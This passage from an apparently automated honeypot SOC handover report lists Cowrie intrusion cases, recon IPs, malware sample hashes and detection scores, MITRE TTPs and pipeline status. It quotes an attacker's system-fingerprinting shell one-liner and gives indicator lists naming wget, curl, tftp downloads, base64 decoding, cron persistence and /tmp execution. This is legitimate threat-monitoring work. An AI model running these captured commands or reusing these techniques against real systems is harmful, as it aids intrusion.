| `2026-07-28 22:50:52` | `cowrie.telnet.option` |
| `2026-07-28 22:50:53` | `cowrie.telnet.option` |
| `2026-07-28 22:50:53` | `cowrie.login.success` |
| `2026-07-28 22:50:54` | `cowrie.session.params` |
| `2026-07-28 22:50:55` | `cowrie.telnet.option` |
| `2026-07-28 22:50:55` | `cowrie.telnet.option` |
| `2026-07-28 22:50:55` | `cowrie.command.input` |
| `2026-07-28 22:50:55` | `cowrie.command.input` |
| `2026-07-28 22:50:55` | `cowrie.command.input` |
| `2026-07-28 22:50:56` | `cowrie.command.input` |
| `2026-07-28 22:50:56` | `cowrie.command.failed` |
| `2026-07-28 22:50:56` | `cowrie.command.input` |
| `2026-07-28 22:50:56` | `cowrie.command.failed` |
| `2026-07-28 22:50:56` | `cowrie.command.input` |
| `2026-07-28 22:50:56` | `cowrie.command.failed` |
| `2026-07-28 22:50:56` | `cowrie.command.input` |
| `2026-07-28 22:50:56` | `cowrie.command.input` |
| `2026-07-28 22:50:56` | `cowrie.command.input` |
| `2026-07-28 22:50:56` | `cowrie.command.input` |
| `2026-07-28 22:50:56` | `cowrie.command.input` |
| `2026-07-28 22:50:56` | `cowrie.command.input` |
| `2026-07-28 22:50:57` | `cowrie.log.closed` |
| `2026-07-28 22:50:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.72.98[.]85` to AbuseIPDB if not already reported
- [ ] Block `27.72.98[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd0d00c6e975

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:51 |
| **Last Seen** | 2026-07-28 22:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:51:06` | `cowrie.session.connect` |
| `2026-07-28 22:51:06` | `cowrie.client.version` |
| `2026-07-28 22:51:06` | `cowrie.client.kex` |
| `2026-07-28 22:51:07` | `cowrie.login.success` |
| `2026-07-28 22:51:08` | `cowrie.session.params` |
| `2026-07-28 22:51:08` | `cowrie.command.input` |
| `2026-07-28 22:51:08` | `cowrie.command.input` |
| `2026-07-28 22:51:08` | `cowrie.command.input` |
| `2026-07-28 22:51:08` | `cowrie.command.input` |
| `2026-07-28 22:51:08` | `cowrie.command.input` |
| `2026-07-28 22:51:08` | `cowrie.command.success` |
| `2026-07-28 22:51:08` | `cowrie.command.input` |
| `2026-07-28 22:51:08` | `cowrie.command.input` |
| `2026-07-28 22:51:08` | `cowrie.command.input` |
| `2026-07-28 22:51:08` | `cowrie.command.input` |
| `2026-07-28 22:51:08` | `cowrie.log.closed` |
| `2026-07-28 22:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edb539b1ece7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:52 |
| **Last Seen** | 2026-07-28 22:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:52:30` | `cowrie.session.connect` |
| `2026-07-28 22:52:31` | `cowrie.client.version` |
| `2026-07-28 22:52:31` | `cowrie.client.kex` |
| `2026-07-28 22:52:32` | `cowrie.login.success` |
| `2026-07-28 22:52:34` | `cowrie.session.params` |
| `2026-07-28 22:52:34` | `cowrie.command.input` |
| `2026-07-28 22:52:34` | `cowrie.command.input` |
| `2026-07-28 22:52:34` | `cowrie.command.input` |
| `2026-07-28 22:52:34` | `cowrie.command.input` |
| `2026-07-28 22:52:34` | `cowrie.command.input` |
| `2026-07-28 22:52:34` | `cowrie.command.success` |
| `2026-07-28 22:52:34` | `cowrie.command.input` |
| `2026-07-28 22:52:34` | `cowrie.command.input` |
| `2026-07-28 22:52:34` | `cowrie.command.input` |
| `2026-07-28 22:52:34` | `cowrie.command.input` |
| `2026-07-28 22:52:34` | `cowrie.log.closed` |
| `2026-07-28 22:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcf6ecb7703f

| Field | Detail |
|---|---|
| **Source IP** | `195.218.159[.]123` |
| **First Seen** | 2026-07-28 22:52 |
| **Last Seen** | 2026-07-28 22:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:52:31` | `cowrie.session.connect` |
| `2026-07-28 22:52:31` | `cowrie.client.version` |
| `2026-07-28 22:52:31` | `cowrie.client.kex` |
| `2026-07-28 22:52:32` | `cowrie.login.success` |
| `2026-07-28 22:52:33` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.218.159[.]123` to AbuseIPDB if not already reported
- [ ] Block `195.218.159[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7afa08e13397

| Field | Detail |
|---|---|
| **Source IP** | `200.89.159[.]59` |
| **First Seen** | 2026-07-28 22:52 |
| **Last Seen** | 2026-07-28 22:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:52:42` | `cowrie.session.connect` |
| `2026-07-28 22:52:42` | `cowrie.client.version` |
| `2026-07-28 22:52:42` | `cowrie.client.kex` |
| `2026-07-28 22:52:44` | `cowrie.login.success` |
| `2026-07-28 22:52:44` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.89.159[.]59` to AbuseIPDB if not already reported
- [ ] Block `200.89.159[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c4f54f244b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:53 |
| **Last Seen** | 2026-07-28 22:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:53:57` | `cowrie.session.connect` |
| `2026-07-28 22:53:57` | `cowrie.client.version` |
| `2026-07-28 22:53:58` | `cowrie.client.kex` |
| `2026-07-28 22:53:58` | `cowrie.login.success` |
| `2026-07-28 22:54:00` | `cowrie.session.params` |
| `2026-07-28 22:54:00` | `cowrie.command.input` |
| `2026-07-28 22:54:00` | `cowrie.command.input` |
| `2026-07-28 22:54:00` | `cowrie.command.input` |
| `2026-07-28 22:54:00` | `cowrie.command.input` |
| `2026-07-28 22:54:00` | `cowrie.command.input` |
| `2026-07-28 22:54:00` | `cowrie.command.success` |
| `2026-07-28 22:54:00` | `cowrie.command.input` |
| `2026-07-28 22:54:00` | `cowrie.command.input` |
| `2026-07-28 22:54:00` | `cowrie.command.input` |
| `2026-07-28 22:54:00` | `cowrie.command.input` |
| `2026-07-28 22:54:00` | `cowrie.log.closed` |
| `2026-07-28 22:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **42** | 2026-07-28 20:55 | 2026-07-28 22:54 | 39m | 0 | `T1592` | 🟠 MEDIUM |
| `132.148.30[.]167` | **6** | 2026-07-28 21:20 | 2026-07-28 22:13 | 3m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-28 21:10 | 2026-07-28 22:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **4** | 2026-07-28 21:55 | 2026-07-28 21:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **4** | 2026-07-28 22:01 | 2026-07-28 22:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | **3** | 2026-07-28 21:28 | 2026-07-28 21:36 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-28 20:55 | 2026-07-28 20:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-28 21:02 | 2026-07-28 21:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]39` | **2** | 2026-07-28 22:23 | 2026-07-28 22:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.87.99[.]202` | 1 | 2026-07-28 21:05 | 2026-07-28 21:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.161.49[.]2` | 1 | 2026-07-28 22:28 | 2026-07-28 22:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-07-28 22:03 | 2026-07-28 22:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-07-28 22:52 | 2026-07-28 22:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-07-28 21:36 | 2026-07-28 21:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]250` | 1 | 2026-07-28 21:13 | 2026-07-28 21:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-28 21:19 | 2026-07-28 21:19 | 43s | 0 | `T1592` | 🟢 LOW |
| `8.136.128[.]232` | 1 | 2026-07-28 21:06 | 2026-07-28 21:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.248.250[.]143` | 1 | 2026-07-28 22:31 | 2026-07-28 22:31 | 6s | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | 1 | 2026-07-28 21:08 | 2026-07-28 21:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]210` | 1 | 2026-07-28 22:06 | 2026-07-28 22:06 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `42.200.60[.]186` | HK | HKT Limited | **100** ⚠️ | 50 |
| `31.41.84[.]98` | PL | Telekom System sp.z o.o. | **100** ⚠️ | 50 |
| `181.214.140[.]22` | GB | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 3 |
| `122.187.227[.]145` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 50 |
| `194.165.16[.]164` | LT | Flyservers S.A. | **100** ⚠️ | 50 |
| `120.87.99[.]202` | CN | China Unicom Guangdong province network | **100** ⚠️ | 13 |
| `111.70.11[.]38` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 33 |
| `193.32.162[.]15` | RO | UNMANAGED LTD | **100** ⚠️ | 18 |
| `197.251.193[.]6` | GH | Ghana Telecommunications Company Limited | **100** ⚠️ | 50 |
| `65.20.179[.]251` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 122 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 109 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 60 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 59 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 58 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 212 cases |
| Tool 34  | Credential Extractor        | ✅ 126 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 77 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (9.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 56 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 109 priority case(s) shown individually · 20 recon entry/entries in table (9 group(s) consolidating 71 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
